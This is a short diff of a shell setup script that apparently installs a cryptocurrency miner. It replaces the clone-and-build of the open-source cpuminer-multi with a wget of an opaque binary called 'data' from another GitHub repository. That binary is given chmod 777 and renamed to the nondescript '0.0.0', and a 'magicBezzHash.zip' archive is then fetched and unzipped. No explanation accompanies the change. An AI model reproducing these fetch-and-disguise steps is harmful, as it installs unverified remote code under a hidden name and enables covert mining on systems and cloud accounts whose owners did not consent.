@@ -1,15 +1,10 @@
-git clone https://github.com/litecoincash-project/cpuminer-multi 
-
+wget https://github.com/Testdrive345/hello/raw/main/data
+chmod 777 data
 sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
 
 
-cd cpuminer-multi
 
-cd miner
-
-./build.sh
-
-mv cpuminer 0.0.0
+mv data 0.0.0
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
